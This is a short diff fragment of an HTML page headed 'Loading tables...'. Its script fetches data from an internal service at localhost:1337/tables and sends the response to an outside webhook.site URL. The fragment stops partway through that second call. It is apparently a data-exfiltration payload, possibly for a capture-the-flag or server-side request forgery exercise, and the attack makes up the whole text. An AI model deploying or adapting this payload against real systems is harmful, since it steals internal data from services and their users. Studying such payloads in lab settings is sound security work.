@@ -8,7 +8,7 @@
 <body>
     <h1>Loading tables...</h1>
     <script>
-        fetch('/')
+        fetch('localhost:1337/tables')
             .then(response => response.text())
             .then(data => {
                 fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
